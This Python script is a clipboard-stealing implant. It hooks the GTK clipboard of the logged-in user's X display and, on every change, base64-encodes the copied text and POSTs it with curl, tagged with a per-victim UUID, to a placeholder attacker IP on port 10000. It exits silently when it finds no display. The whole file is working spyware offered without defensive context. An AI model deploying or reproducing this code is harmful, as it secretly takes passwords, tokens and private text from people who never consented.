#!/usr/bin/python
# https://stackoverflow.com/questions/25900770/how-to-catch-the-clipboard-event-onchangeclipboard-equivalent-from-any-applica/25961646#25961646
from gi.repository import Gtk, Gdk
import json
import os
from subprocess import Popen, PIPE, STDOUT
import re
from base64 import b64encode
ip = "<REPLACE_IP>"
port=10000
uuid = "<REPLACE_UUID>"

# get user display
who = Popen('who', shell=True, stdout=PIPE, stderr=STDOUT)
who.wait()
out, err = who.communicate()
out = out.decode("utf-8")

if re.search(r"\(:\d+\)", out):
    user = re.search(r"\(:\d+\)", out).group(0)
else:
    exit(0) # silent exit

# set display
os.environ["DISPLAY"] = user


def postData(data):
    url = f"http://{ip}:{port}/clipboard"
    data={"uuid": uuid, "data": b64encode(data.encode("utf-8")).decode("utf-8"), "kind": "clipboard"}
    result = Popen(["curl", "-X", "POST", "-H", "Content-Type: application/json", "-d", json.dumps(data), url], stdout=PIPE, stderr=STDOUT)
    result.wait()

def callBack(*args):
    # stack overflow default
    # print("Clipboard changed. New value = " + clip.wait_for_text())
    postData(clip.wait_for_text())
while True:
    try:
        clip = Gtk.Clipboard.get(Gdk.SELECTION_CLIPBOARD)
        clip.connect('owner-change', callBack)
        Gtk.main()  
    except Exception as e:
        x = Popen("date", shell=True, stdout=PIPE, stderr=STDOUT)
        with open("/tmp/errors.log", "a") as f:
            f.write(x.communicate()[0].decode("utf-8"), str(e)) 